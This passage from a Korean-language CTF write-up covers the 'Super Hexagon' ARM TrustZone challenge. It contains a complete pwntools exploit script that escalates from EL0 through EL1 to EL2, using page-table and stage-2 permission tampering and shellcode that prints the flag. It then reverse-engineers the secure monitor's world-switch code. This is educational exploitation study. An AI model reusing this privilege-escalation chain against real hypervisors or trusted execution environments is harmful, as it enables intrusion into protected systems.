그리고 이 취약점을 이용하면 0x3c000보다 작은 임의 IPA에 대해 할당하고 PA를 매핑할 때 S2AP는 하위 1바이트안에 들어가니 이를 이용해 RWX 페이지를 매핑할 수 있다는 것을 알았다.
근데 IPA는 EL1에서 임의 코드 실행을 달성한 순간부터 원하는 VA와 매핑할 수 있다.
![](attachment/c6a0733d063d71922ba30f130677810c.png)
사실 익스플로잇 방식은 추가적으로 찾아봤을때 유사한것으로 보인다.
위 그림에서 설명하는건 일종의 mitigation이긴 하다.
EL2에서 취약점은 IPA갖고 엔트리의 플래그가 바뀌는 취약점으로 인해 위 사진과는 다르게 권한 고정이 애초에 실패한 문제가 생겼다.
하이퍼바이저쪽 페이지 권한이 컨트롤 가능하다면, 사실상 IPA는 이미 컨트롤가능하니 이걸로 이전과 똑같이 공격을 하면 된다.

마저 익스플로잇 전략을 설명하자면 hypercall handler가 위치한 페이지를 바꿔치기해서 다음과 같이 해준다.
1) EL1에서 EL0쪽 PTE를 변조해서 특정 IPA를 가리키도록 하고 AP 01로 설정한다.
2) hvc로 변조한 특정 IPA를 hypervisor의 handler 코드 페이지를 가리키는 PA로 세팅하고 S2AP 11로 설정한다.
3) EL2 shellcode를 EL2 0x40102000에 복사한다.
![](attachment/e13df9b643049373581aa1888e4a1078.png)
참고로 gef pagewalk가 권한을 틀리게 보여줘서 직접 손으로 pagewalk해서 확인했다.
## Exploit code (flag & code execution)
```Python
from pwn import *
from keystone import *
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
context.binary = e = ELF('./super_hexagon/share/_bios.bin.extracted/BC010')
ks = Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN)

sc_st = 0x7ffeffffd006
shellcode = b''
shellcode += bytes(ks.asm(f'''\
    mov x5, #-1
    mov w4, #0x0
    mov w3, #0x0
    mov w2, #3
    mov x1, #0x1000
    mov x0, #0x0
    mov x8, #0xde
    svc #0x1337
    mov x11, x0
    mov w9, #0x0
    loop:                   
        add x1, x11, x9
        mov x8, #0x3f
        mov x0, #0
        mov x2, #0x1
        svc #0x1337
        add w9, w9, #1
        cmp x9, #0x1000
        bne loop
    mov x0, x11
    mov x1, #0x1000
    mov x2, #5
    mov x8, #0xe2
    svc #0x1337
    blr x11
''')[0])
assert b'\r' not in shellcode and b'\x0a' not in shellcode
p = remote('localhost',6666)
payload = b'A' * 0x100
payload += p64(0xdeadbeef) 
payload += p64(e.sym.gets) # cmd = 1
sla(b'cmd> ', b'1')
sla(b'index: ', str(0))
sla(b'key: ', payload)
sleep(0.1)
payload = b'A' * 0b101 + b'\x00'
payload += shellcode
p.sendline(payload)
sla(b'cmd> ', b'1')
sla(b'index: ', str(0x1000))
payload = b''
payload += b'A'*0b101 + b'\x00'
payload += b'A'*(0x100 - len(payload))
payload += p64(0xdeadbeef)
payload += p64(e.sym.mprotect)
payload += p64(sc_st)
sla(b'key: ', payload)
sla(b'cmd> ',b'2')
sla(b'index: ', str(1))
sleep(0.1)
UART= 0x0000000009000000
read_flag = [1, 252, 59, 213, 1, 0, 0, 185, 33, 252, 59, 213, 1, 4, 0, 185, 65, 252, 59, 213, 1, 8, 0, 185, 97, 252, 59, 213, 1, 12, 0, 185, 129, 252, 59, 213, 1, 16, 0, 185, 161, 252, 59, 213, 1, 20, 0, 185, 193, 252, 59, 213, 1, 24, 0, 185, 225, 252, 59, 213, 1, 28, 0, 185]
EL2_shellcode = asm(f'''\
    movz x11, #{((UART)>>48)&0xffff}, lsl #48
    movk x11, #{((UART)>>32)&0xffff}, lsl #32
    movk x11, #{((UART)>>16)&0xffff}, lsl #16
    movk x11, #{(UART)&0xffff}, lsl #0
    mov x0, sp
''') + bytes(read_flag) + asm(f'''\
    mov x9, #0
    loop:
        add x0, sp, x9 
        ldrb w0, [x0]
        strb w0, [x11]
        add x9, x9, #1
        cmp x9, #32
        bne loop
''')
EL2_shellcode = b'\x41'*0xc+EL2_shellcode
entry = 0xffffffffc001e000 + 0xf0 
addr = 0xffffffffc00091b8
IPA = 0x2400 | (0b11<<6) # s2ap 11
DESC = 3 | 0x100000
EL2_TEXT = 0x00007ffeffffa000
entry_user = 0xffffffffc0028000 + 0xfd0
user_val = 0x2403 | 64 | 0x0020000000000000# ap 01
EL2_shellcode_addr = 0x7ffeffffc100
EL1_shellcode = asm(f'nop')*(0x400//4)
EL1_shellcode += asm(f'''\
    mov x0, #1
    movz x1, #{((IPA)>>48)&0xffff}, lsl #48
    movk x1, #{((IPA)>>32)&0xffff}, lsl #32
    movk x1, #{((IPA)>>16)&0xffff}, lsl #16
    movk x1, #{(IPA)&0xffff}, lsl #0
    movz x2, #{((DESC)>>48)&0xffff}, lsl #48
    movk x2, #{((DESC)>>32)&0xffff}, lsl #32
    movk x2, #{((DESC)>>16)&0xffff}, lsl #16
    movk x2, #{(DESC)&0xffff}, lsl #0
    hvc #0x1337 // PA 0x0000000040102000 RWX
    movz x11, #{((entry_user)>>48)&0xffff}, lsl #48
    movk x11, #{((entry_user)>>32)&0xffff}, lsl #32
    movk x11, #{((entry_user)>>16)&0xffff}, lsl #16
    movk x11, #{(entry_user)&0xffff}, lsl #0
    movz x10, #{((user_val)>>48)&0xffff}, lsl #48
    movk x10, #{((user_val)>>32)&0xffff}, lsl #32
    movk x10, #{((user_val)>>16)&0xffff}, lsl #16
    movk x10, #{(user_val)&0xffff}, lsl #0
    str x10, [x11] // IPA 0x0000000000002000 RW
    movz x11, #{((EL2_TEXT)>>48)&0xffff}, lsl #48
    movk x11, #{((EL2_TEXT)>>32)&0xffff}, lsl #32
    movk x11, #{((EL2_TEXT)>>16)&0xffff}, lsl #16
    movk x11, #{(EL2_TEXT)&0xffff}, lsl #0
    movz x12, #{((EL2_shellcode_addr)>>48)&0xffff}, lsl #48
    movk x12, #{((EL2_shellcode_addr)>>32)&0xffff}, lsl #32
    movk x12, #{((EL2_shellcode_addr)>>16)&0xffff}, lsl #16
    movk x12, #{(EL2_shellcode_addr)&0xffff}, lsl #0
    mov x9, #0x0 
    loop:                  
        add x2, x11, x9
        add x1, x12, x9
        ldrb w0, [x1]
        strb w0, [x2]
        add w9, w9, #1
        cmp x9, #{len(EL2_shellcode)}
        bne loop
    hvc #0x1337 // trigger!!!
''')
cnt = len(EL1_shellcode)
val = 0x0040000000036483
shellcode = f'''\
    mov x5, #-1
    mov w4, #0x0
    mov w3, #0x0
    mov w2, #3
    mov x1, #0x1000
    mov x0, #0x0
    mov x8, #0xde
    svc #0x1337
    mov x11, x0 // IPA 0x36000
    mov x9, #0x0 
    loop:                   
        add x1, x11, x9
        mov x8, #0x3f
        mov x0, #0
        mov x2, #0x1
        svc #0x1337
        add w9, w9, #1
        cmp x9, #{cnt}
        bne loop
    mov x0, x11
    mov x1, #0x1000
    mov x2, #5 // r-x
    mov x8, #0xe2
    svc #0x1337
    mov x5, #-1
    mov w4, #0x0
    mov w3, #0x0
    mov w2, #3
    mov x1, #0x1000
    mov x0, #0x0
    mov x8, #0xde
    svc #0x1337 // IPA 0x37000
    movz x11, #{((entry)>>48)&0xffff}, lsl #48
    movk x11, #{((entry)>>32)&0xffff}, lsl #32
    movk x11, #{((entry)>>16)&0xffff}, lsl #16
    movk x11, #{(entry)&0xffff}, lsl #0
    mov x0, #0
    mov x1, x11
    mov x8, #0x3f
    mov x2, #1
    svc #0x1337 // now we can modify the kernel page table
    movz x10, #{((val)>>48)&0xffff}, lsl #48
    movk x10, #{((val)>>32)&0xffff}, lsl #32
    movk x10, #{((val)>>16)&0xffff}, lsl #16
    movk x10, #{(val)&0xffff}, lsl #0
    sub x11, x11, #0xa0
    str x10, [x11]
    mov x8, #0x123
    svc #0x1337
'''
payload = bytes(ks.asm(shellcode)[0])
payload += b'\x41' * (0x100 - len(payload))
payload += EL2_shellcode
payload += b'\x41' * (0x1000 - len(payload))
p.send(payload)
sleep(0.1)
p.send(EL1_shellcode)
sleep(0.1)
pause()
p.send(b'\x43') # AP 01 -> EL0 RW EL1 RW 
sleep(0.1)
p.interactive()
```
# Exploring the Secure world
Normal world의 최고 exception level까진 도달했다.
non-secure physical memory의 모든 부분이 제어 가능하다.
이제 secure world로 넘어가야한다.
![](attachment/00cdfe972dd80aebcd7650dc35aea770.png)
전에 arm trustzone 관련해서 메뉴얼을 정리하면서 어떻게 trustzone이 메모리 격리를 유지하는지에 대해서 설명했었다.
간단하게 리마인드하자면 ARM CPU는 NS 비트를 하드웨어적으로 지원해서 메모리 격리를 유지하고 캐시 라인에서도 NS를 추가하면 따로 tlb flush도 안해도 되는식으로 구현을 했다.
ARM CPU는 SMMU를 통해 Non-secure world에서의 장치 액세스를 막아서 실질적으로 Secure world도 점거해야 중요한 장치를 공격할 수 있다.

그리고 분석을 더 해보니까 S-EL3는 flash에서 돌아서 수정 불가능한 메모리로써 MMIO 방식으로 동작한다.
사실 실행되는 코드도 적어서 flash로 올려서 돌리는것도 코드 무결성을 보장하는데 되게 현명한 방법이라는 생각이 들었다.
## Debugging the Secure world
![](attachment/e1c8aa4c9a7a3a73fd4680cedd07aafb.png)
qemu에서 32bit 디버깅을 지원하지 않는다.
그래서 직접 빌드했다.
github에서 v3.0.0 checkout해서 빌드하려 했더니 오류나길래 직접 공식 사이트에서 소스 코드를 받아서 빌드했다
```Bash
wget https://download.qemu.org/qemu-3.0.0.tar.xz
tar -xvf ./qemu-3.0.0.tar.xz
cd qemu-3.0.0
./configure --target-list=aarch64-softmmu --disable-werror
make -j 4
```
egl-helpers.h에 `#include <X11/Xlib.h>`를 넣어주고 빌드했다.
static 빌드하고 싶었는데 xkbcommon 때문에 계속 실패해서 그냥 했다.
  
빌드한거 옮겨서 세팅했다.
```Bash
#!/bin/sh
#!/bin/sh
/home/super_hexagon/qemu-system-aarch64_debug_arm32 -nographic -machine hitcon -cpu hitcon -bios /home/super_hexagon/bios.bin -monitor /dev/null 2>/dev/null -serial stdio -s 
```
화면이 프린트 안돼서 serial에 stdio 줘봤더니 잘 프린트된다.
![](attachment/ecc4672a43444ca18696c0f270cdff4f.png)
디버거도 ARM32로 잘 잡힌다.
## Analyzing the secure monitor
![](attachment/5bb559ad0ea51c84f204aab094892d6a.png)
이제 secure memory를 직접 봐야하기 때문에 로컬에서 디버깅을 시작했다.
```Python
p = process('./local_debug.sh')
```
그냥 전에 익스플로잇 코드에서 이렇게 바꿔주면 전에 미리 만들어뒀던 gdbscript로 secure memory를 볼 수 있다.
secure world 전환 이전에 secure memory를 볼일이 종종 있어서 로컬이 제일 편하다.
  
부팅 과정에서 가장 높은 exception level로 부팅을 시도하기에 전에 분석했었던 S-EL3의 부트로더부분으로 돌아가야한다.
거기서 VBAR_EL3가 0x2000인 것을 얻을 수 있다.
![](attachment/9814c10d84dabf9c854bf4b176a9677a.png)
일단 EL2에서 S-EL3를 바로 공격하는게 가능한지 확인해봤다.
```C
long * FUN_00000330(uint x0,long x1,undefined8 2,undefined8 x3)
{
  ulong uVar1;
  long *plVar2;
  ulong in_x7;
  
  uVar1 = FUN_00000254();
  if ((in_x7 & 1) == 0) {
    if (x0 != 0x83000002) {
      if (x0 == 0x83000007) {
        FUN_00000ad0(0);
        plVar2 = (long *)FUN_0000089c(1);
        FUN_00000aec(1);
        FUN_00000bb4(1);
        *plVar2 = x1;
        return plVar2;
      }
      FUN_00000d28();
      FUN_00000310();
    }
    FUN_000006d0(&DAT_00001910);
    _DAT_0e002000 = 1;
    _DAT_0e002420 = x1;
    FUN_00000ad0(0);
    plVar2 = (long *)FUN_0000089c(1);
    FUN_00000aec(1);
    FUN_00000bb4(1);
    *plVar2 = 0;
  }
  else {
    uVar1 = uVar1 & 0xffffffff;
	    /* save non-secure system register */
    FUN_00000ad0(1);
    if (x0 == 0x83000001) {
      if (_DAT_0e002000 != 0) {
        plVar2 = (long *)FUN_0000089c(1);
        FUN_00000aec(1);
        FUN_00000bb4(1);
        *plVar2 = -1;
        return plVar2;
      }
      FUN_0000025c();
      FUN_000002c8();
    }
    FUN_00000b2c(0,_DAT_0e002420 + 0x20,0x1d3);
    FUN_00000aec(0);
    FUN_00000bb4(0);
    *(undefined8 *)(uVar1 * 0x220 + 0xe002468) = x3;
    *(undefined8 *)(uVar1 * 0x220 + 0xe002460) = 2;
    *(long *)(uVar1 * 0x220 + 0xe002458) = x1;
    *(ulong *)(uVar1 * 0x220 + 0xe002450) = (ulong)x0;
    plVar2 = (long *)(uVar1 * 0x220 + 0xe002450);
  }
  return plVar2;
}
```
EL3의 bootloader에서 미리 0xe000000 쪽의 메모리를 0으로 밀었었다.
FUN_00000ad0는 다음과 같이 기존 non-secure system register를 특정 secure memory의 주소 + 0x130에 저장한다.
이는 아마 gerneral purpose register까지 저장하기에 그런 것 같다.
```c
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_00000dec ()
             undefined         w0:1           <RETURN>
                             FUN_00000dec                                    XREF[1]:     FUN_00000ad0:00000ae0 (c)   
        00000dec 09  40  38  d5    mrs        x9,spsr_el1
        00000df0 2a  40  38  d5    mrs        x10 ,elr_el1
        00000df4 09  28  00  a9    stp        x9,x10 ,[x0]
        00000df8 0f  10  38  d5    mrs        x15 ,sctlr_el1
        00000dfc 30  10  38  d5    mrs        x16 ,actlr_el1
        00000e00 0f  40  01  a9    stp        x15 ,x16 ,[x0, #0x10 ]
        00000e04 51  10  38  d5    mrs        x17 ,cpacr_el1
        00000e08 09  00  3a  d5    mrs        x9,csselr_el1
        00000e0c 11  24  02  a9    stp        x17 ,x9,[x0, #0x20 ]
        00000e10 0a  41  3c  d5    mrs        x10 ,sp_el1
        00000e14 0b  52  38  d5    mrs        x11 ,esr_el1
        00000e18 0a  2c  03  a9    stp        x10 ,x11 ,[x0, #0x30 ]
        00000e1c 0c  20  38  d5    mrs        x12 ,ttbr0_el1
        00000e20 2d  20  38  d5    mrs        x13 ,ttbr1_el1
        00000e24 0c  34  04  a9    stp        x12 ,x13 ,[x0, #0x40 ]
        00000e28 0e  a2  38  d5    mrs        x14 ,mair_el1
        00000e2c 0f  a3  38  d5    mrs        x15 ,amair_el1
        00000e30 0e  3c  05  a9    stp        x14 ,x15 ,[x0, #0x50 ]
        00000e34 50  20  38  d5    mrs        x16 ,tcr_el1
        00000e38 91  d0  38  d5    mrs        x17 ,tpidr_el1
        00000e3c 10  44  06  a9    stp        x16 ,x17 ,[x0, #0x60 ]
        00000e40 49  d0  3b  d5    mrs        x9,tpidr_el0
        00000e44 6a  d0  3b  d5    mrs        x10 ,tpidrro_el0
        00000e48 09  28  07  a9    stp        x9,x10 ,[x0, #0x70 ]
        00000e4c 0d  74  38  d5    mrs        x13 ,par_el1
        00000e50 0e  60  38  d5    mrs        x14 ,far_el1
        00000e54 0d  38  08  a9    stp        x13 ,x14 ,[x0, #0x80 ]
        00000e58 0f  51  38  d5    mrs        x15 ,afsr0_el1
        00000e5c 30  51  38  d5    mrs        x16 ,afsr1_el1
        00000e60 0f  40  09  a9    stp        x15 ,x16 ,[x0, #0x90 ]
        00000e64 31  d0  38  d5    mrs        x17 ,contextidr_el1
        00000e68 09  c0  38  d5    mrs        x9,vbar_el1
        00000e6c 11  24  0a  a9    stp        x17 ,x9,[x0, #0xa0 ]
        00000e70 0a  9c  3b  d5    mrs        x10 ,pmcr_el0
        00000e74 0a  58  00  f9    str        x10 ,[x0, #0xb0 ]
        00000e78 c0  03  5f  d6    ret
```
아마 SEL2는 구현되지 않아서 최대 EL1까지의 레지스터만 저장하는 것으로 보인다.
  
전에 trustzone 구현 메뉴얼을 살펴봤다.
그때 SCR_EL3.NS를 반전시켜 non-secure과 secure 전환을 한다고 했었는데, 그전에 이렇게 system register의 save/load가 필요했다
그렇다면 이런 save 함수가 있으니 이는 secure world 진입 직전일 것이고, 당연히 stack context 복구나 saved system registers를 다시 restore하는 함수도 있을 것임을 알 수 있다.
이런 구조를 염두에 두고 분석하면 쉽게 분석할 수 있다.
```C
long * FUN_00000330(uint x0,long x1,undefined8 x2,undefined8 x3)
{
  ulong uVar1;
  long *plVar2;
  ulong non_secure;
  
  uVar1 = FUN_00000254();
  if ((non_secure & 1) == 0) {
    if (x0 != 0x83000002) {
      if (x0 == 0x83000007) {
        save_el1_sysregs(0);
        plVar2 = (long *)get_secure_mem(1);
        restore_sysregs(1);
        set_spelx(1);
        *plVar2 = x1;
        return plVar2;
      }
      FUN_00000d28();
      do_panic();
    }
                    /* tee os initialized */
    print_log(&DAT_00001910);
    _is_booted = 1;
    _DAT_0e002420 = x1;
    save_el1_sysregs(0);
    plVar2 = (long *)get_secure_mem(1);
    restore_sysregs(1);
    set_spelx(1);
    *plVar2 = 0;
  }
  else {
    uVar1 = uVar1 & 0xffffffff;
                    /* save non-secure system register */
    save_el1_sysregs(1);
    if (x0 == 0x83000001) {
      if (_is_booted != 0) {
        plVar2 = (long *)get_secure_mem(1);
        restore_sysregs(1);
        set_spelx(1);
        *plVar2 = -1;
        return plVar2;
      }
      FUN_0000025c();
      FUN_000002c8();
    }
    FUN_00000b2c(0,_DAT_0e002420 + 0x20,0x1d3);
    restore_sysregs(0);
    set_spelx(0);
    *(undefined8 *)(uVar1 * 0x220 + 0xe002468) = x3;
    *(undefined8 *)(uVar1 * 0x220 + 0xe002460) = x2;
    *(long *)(uVar1 * 0x220 + 0xe002458) = x1;
    *(ulong *)(uVar1 * 0x220 + 0xe002450) = (ulong)x0;
    plVar2 = (long *)(uVar1 * 0x220 + 0xe002450);
  }
  return plVar2;
}
```
x0 == 0x83000001는 딱봐도 secure → normal이고 아래가 normal → secure이다.
그 위 부분들은 secure world에서 호출시에만 동작하니 일단 생략한다.
위 함수가 호출되기 전에 조금 흥미로운 작업을 수행한다.
```c
                             LAB_00002800                                    XREF[2]:     00002414 (j) , 00002614 (j)   
        00002800 00  01  80  d2    mov        param_1 ,#0x8
        00002804 79  f9  ff  97    bl         FUN_00000de8                                     undefined FUN_00000de8()
        00002808 76  f9  ff  97    bl         FUN_00000de0                                     undefined FUN_00000de0()
                             sp = 0xe002210 
                             fill out general purpose regs
                             LAB_0000280c                                    XREF[2]:     00002418 (j) , 00002618 (j)   
        0000280c c0  f9  ff  97    bl         FUN_00000f0c                                     undefined FUN_00000f0c(undefined
        00002810 e5  03  1f  aa    mov        param_6 ,xzr
        00002814 e6  03  00  91    mov        param_7 ,sp
        00002818 cc  88  40  f9    ldr        x12 ,[param_7 , #0x110 ]
        0000281c bf  40  00  d5    msr        PState.SP,#0x0
        00002820 9f  01  00  91    mov        sp,x12
        00002824 10  40  3e  d5    mrs        x16 ,spsr_el3
        00002828 31  40  3e  d5    mrs        x17 ,elr_el3
        0000282c 12  11  3e  d5    mrs        x18 ,scr_el3
        00002830 d0  c4  11  a9    stp        x16 ,x17 ,[param_7 , #0x118 ]
        00002834 d2  80  00  f9    str        x18 ,[x6, #param_12 ]
        00002838 47  02  40  b3    bfxil      param_8 ,x18 ,#0x0 ,#0x1
        0000283c 06  f8  ff  97    bl         FUN_00000854                                     undefined FUN_00000854(void)
        00002840 da  f9  ff  17    b          FUN_00000fa8                                     undefined FUN_00000fa8(undefined
                             -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
```
디컴파일러에선 아예 보이지 않는데, 여기서 normal world context가 저장된 sp를 param_7(w6)에 넣고 spsr_el3, elr_el3, scr_el3를 저장한다.
PState.SP에 0을 넣고 s-el3의 특정 stack 주소를 세팅해서 동작을 이어간다.
```c
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  set_spelx ()
             undefined         w0:1           <RETURN>
             undefined8        Stack[-0x10]:8 local_10                                XREF[1]:     00000bb4 (W)   
                             set_spelx                                       XREF[6]:     FUN_000001f8:00000214 (c) , 
                                                                                          FUN_00000330:0000039c (c) , 
                                                                                          FUN_00000330:00000404 (c) , 
                                                                                          FUN_00000330:00000488 (c) , 
                                                                                          FUN_00000330:000004f0 (c) , 
                                                                                          FUN_00000bd4:00000bfc (c)   
        00000bb4 fd  7b  bf  a9    stp        x29 ,x30 ,[sp, #local_10 ]!
        00000bb8 fd  03  00  91    mov        x29 ,sp
        00000bbc 38  ff  ff  97    bl         get_secure_mem                                   world_ctx * get_secure_mem(uint6
        00000bc0 bf  41  00  d5    msr        PState.SP,#0x1
        00000bc4 1f  00  00  91    mov        sp,x0
        00000bc8 bf  40  00  d5    msr        PState.SP,#0x0
        00000bcc fd  7b  c1  a8    ldp        x29 ,x30 ,[sp], #0x10
        00000bd0 c0  03  5f  d6    ret
```
여기서 sp_elxh를 세팅한다.
아까 normal world context가 sp_elxh가 가리키는 구조체였고 이전에 normal world context에 접근하나, secure world context에 접근하냐에 따라 S-EL3에 진입할 때 어떤 world context에 저장할지 결정된다.
```c
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_00000fa8 (undefined  param_1 , undefined  par
             undefined         w0:1           <RETURN>
             undefined         w0:1           param_1
             undefined         w1:1           param_2
             undefined         w2:1           param_3
             undefined         w3:1           param_4
             undefined         w4:1           param_5
             undefined         w5:1           param_6
             undefined         w6:1           param_7
             undefined         w7:1           param_8
             undefined         Stack[0x0]:1   param_9
             undefined         Stack[0x8]:1   param_10
             undefined8        Stack[0x110]:8 param_11                                XREF[1]:     00000fb0 (W)   
             undefined8        Stack[0x120]:8 ELR_EL3
             undefined8        Stack[0x118]:8 SPSR_EL3                                XREF[1]:     00000fb8 (R)   
             undefined8        Stack[0x100]:8 SCR_EL3                                 XREF[1]:     00000fb4 (R)   
                             FUN_00000fa8                                    XREF[3]:     Reset:000000b0 (c) , 
                                                                                          FUN_00000c90:00000cb4 (c) , 
                                                                                          FUN_00002400:00002840 (c)   
        00000fa8 f1  03  00  91    mov        x17 ,sp
        00000fac bf  41  00  d5    msr        PState.SP,#0x1
        00000fb0 f1  8b  00  f9    str        x17 ,[sp, #param_11 ]
        00000fb4 f2  83  40  f9    ldr        x18 ,[sp, #SCR_EL3 ]
        00000fb8 f0  c7  51  a9    ldp        x16 ,x17 ,[sp, #SPSR_EL3 ]
        00000fbc 12  11  1e  d5    msr        scr_el3 ,x18
        00000fc0 10  40  1e  d5    msr        spsr_el3 ,x16
        00000fc4 31  40  1e  d5    msr        elr_el3 ,x17
        00000fc8 f5  ff  ff  17    b          FUN_00000f9c                                     undefined FUN_00000f9c(undefined
                             -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
```
그리고 마지막으로 여기서 world switch를 수행한다.
FUN_00000f9c에선 general purpose register 불러오고 eret을 수행한다.
  
아무리 봐도 악용할만한 취약점이 보이지 않았다.
그래서 S-EL0 부터 공격하기로 결정했다.
## Analyzing the Interaction Between the Normal World and the Secure World
### EL0 review
다시 EL0로 돌아가서 어떻게 처리되는지를 봐야한다.
```C
void load_trustlet(byte *param_1,int size)
{
  ...
  iVar1 = tc_init_trustlet(iVar1,size);
  if (iVar1 == 0) {
    pTVar3 = (TCI *)mmap((void *)0x0,0x1000,3,0,0,-1);
    uVar2 = tc_register_wsm(pTVar3,0x1000);
    if (uVar2 != 0xffffffff) {
      tci_buf = pTVar3;
      tci_handle = uVar2;
      return;
    }
  ...
```
위와 같은 방식으로 초기화를 했었고 TA_bin이라는 이상한 바이너리를 넘겼었다.
![](attachment/c9c79ed8ed15d70737ce52b89dbfd0e1.png)
```C
int load_key(int x,char *buf)
{
  ...
  tci_buf->cmd = 2;
  tci_buf->index = x;
  tc_tci_call(tci_handle);
  if (tci_buf->cmd == 0) {
  ...
```
위와 같이 tci_call로 키를 save, load를 했었다.
```C
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  tc_init_trustlet ()
             undefined         w0:1           <RETURN>
                             tc_init_trustlet                                XREF[2]:     Entry Point (*) , 
                                                                                          load_trustlet:0040019c (c)   
        00401b74 a8  00  80  d2    mov        x8,#0x5
        00401b78 08  e0  bf  f2    movk       x8,#0xff00 , LSL #16
        00401b7c 01  00  00  d4    svc        0x0
        00401b80 c0  03  5f  d6    ret
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  tc_register_wsm ()
             undefined         w0:1           <RETURN>
                             tc_register_wsm                                 XREF[3]:     Entry Point (*) , 
                                                                                          load_trustlet:00400174 (c) , 
                                                                                          load_trustlet:004001c8 (c)   
        00401b84 68  00  80  d2    mov        x8,#0x3
        00401b88 08  e0  bf  f2    movk       x8,#0xff00 , LSL #16
        00401b8c 01  00  00  d4    svc        0x0
        00401b90 c0  03  5f  d6    ret
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  tc_tci_call ()
             undefined         w0:1           <RETURN>
                             tc_tci_call                                     XREF[3]:     Entry Point (*) , 
                                                                                          load_key:00400324 (c) , 
                                                                                          save_key:00400490 (c)   
        00401b94 c8  00  80  d2    mov        x8,#0x6
        00401b98 08  e0  bf  f2    movk       x8,#0xff00 , LSL #16
        00401b9c 01  00  00  d4    svc        0x0
        00401ba0 c0  03  5f  d6    ret
```
위와 같은 x8 값을 갖는다.
### EL1 review
```C
void FUN_ffffffffc0008ba8(long param_1)
{
  ...
                usr = (undefined *)0xffffffffffffffff;
            }
          }
          else {
            usr = (undefined *)0xffffffffffffffff;
          }
        }
        else if ((x8 & 0xff000000) == 0xff000000) {
          usr = (undefined *)FUN_ffffffffc0008a34(x8,x0,x1,x2);
        }
        else {
          usr = (undefined *)0xffffffffffffffff;
        }
   ...
```
위와 같이 따로 처리 로직이 존재한다.
```C
ulong FUN_ffffffffc0008a34(long x8,ulong x0,ulong x1,ulong x2)
{
  ulong uVar1;
  long lVar2;
  long lVar3;
  
  if (x8 == 0xff000005) {
    if ((x0 & 0xfff) == 0) {
      uVar1 = secure_monitor_call(0x83000005,x0 & 0xffffffff,x1 & 0xffffffff,0);
    }
    else {
      uVar1 = 0xffffffffffffffff;
    }
  }
  else if (x8 == 0xff000003) {
    if ((x1 & 0xfff) == 0) {
      if (x1 < 0x4001) {
        if ((x0 & 0xfff) == 0) {
          lVar2 = FUN_ffffffffc0009174(x0);
          if ((int)lVar2 == -1) {
            uVar1 = 0xffffffffffffffff;
          }
          else {
            for (uVar1 = x0 + 0x1000; uVar1 < x0 + x1; uVar1 = uVar1 + 0x1000) {
              lVar3 = FUN_ffffffffc0009174(uVar1);
              if ((int)lVar3 == -1) {
                return 0xffffffffffffffff;
              }
              if ((uVar1 + lVar2) - x0 != lVar3) {
                return 0xffffffffffffffff;
              }
            }
            uVar1 = secure_monitor_call(0x83000003,lVar2,x1,0);
            uVar1 = uVar1 & 0xffffffff;
          }
        }
        else {
          uVar1 = 0xffffffffffffffff;
        }
      }
      else {
        uVar1 = 0xffffffffffffffff;
      }
    }
    else {
      uVar1 = 0xffffffffffffffff;
    }
  }
  else if (x8 == 0xff000006) {
    if ((x0 & 0xfff) == 0) {
      uVar1 = secure_monitor_call(0x83000006,x0,0,0);
    }
    else {
      uVar1 = 0xffffffffffffffff;
    }
  }
  else {
    uVar1 = 0xffffffffffffffff;
  }
  return uVar1;
}
```
```C
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_ffffffffc0009174 ()
             undefined         w0:1           <RETURN>
                             FUN_ffffffffc0009174                            XREF[5]:     FUN_ffffffffc00086e8:ffffffffc00
                                                                                          FUN_ffffffffc0008a34:ffffffffc00
                                                                                          FUN_ffffffffc0008a34:ffffffffc00
                                                                                          FUN_ffffffffc0008ba8:ffffffffc00
                                                                                          FUN_ffffffffc0008ba8:ffffffffc00
     fffc0009174 40  78  08  d5    at         S1E0R, x0
     fffc0009178 00  74  38  d5    mrs        x0,par_el1
     fffc000917c 01  00  40  92    and        x1,x0,#0x1
     fffc0009180 3f  04  00  f1    cmp        x1,#0x1
     fffc0009184 c0  00  00  54    b.eq       LAB_ffffffffc000919c
     fffc0009188 01  00  9e  d2    mov        x1,#0xf000
     fffc000918c e1  ff  bf  f2    movk       x1,#0xffff , LSL #16
     fffc0009190 e1  ff  df  f2    movk       x1,#0xffff , LSL #32
     fffc0009194 00  00  01  8a    and        x0,x0,x1
     fffc0009198 c0  03  5f  d6    ret
                             LAB_ffffffffc000919c                            XREF[1]:     ffffffffc0009184 (j)   
     fffc000919c 00  00  80  92    mov        x0,#-0x1
     fffc00091a0 c0  03  5f  d6    ret
```
실질적으로 약간의 넘겨진 메모리 주소 검사를 해주고 모두 secure monitor로 넘긴다.
### EL2 review
```C
ulong FUN_401003d8(long *saved_reg)
{
...
  else if (EC_ == 0b00010111) {
    if (x0 == 0x83000003) {
      if (x1 < 0x3c001) {
        x0 = SMC_handler(0x83000003,x1 + 0x40000000);
      }
      else {
        x0 = -1;
      }
    }
    else {
      x0 = SMC_handler(x0,x1);
    }
...
```
IPA → PA를 해주고 Secure monitor로 마저 넘긴다.
### S-EL3
```C
world_ctx * FUN_00000330(uint x0,uint64_t x1,uint64_t x2,uint64_t x3)
{
  ulong uVar1;
  world_ctx *pwVar2;
  ulong non_secure;
  
  uVar1 = ret_0();
  if ((non_secure & 1) == 0) {
    if (x0 != 0x83000002) {
      if (x0 == 0x83000007) {
        save_el1_sysregs(0);
        pwVar2 = get_secure_mem(1);
        restore_sysregs(1);
        set_spelx(1);
        pwVar2->x0 = x1;
        return pwVar2;
      }
      FUN_00000d28();
      do_panic();
    }
                    /* tee os initialized */
    print_log(&DAT_00001910);
    is_booted = 1;
    tmp.PC = x1;
    save_el1_sysregs(0);
    pwVar2 = get_secure_mem(1);
    restore_sysregs(1);
    set_spelx(1);
    pwVar2->x0 = 0;
  }
  else {
    uVar1 = uVar1 & 0xffffffff;
                    /* save non-secure system register */
    save_el1_sysregs(1);
    if (x0 == 0x83000001) {
      if (is_booted != 0) {
        pwVar2 = get_secure_mem(1);
        restore_sysregs(1);
        set_spelx(1);
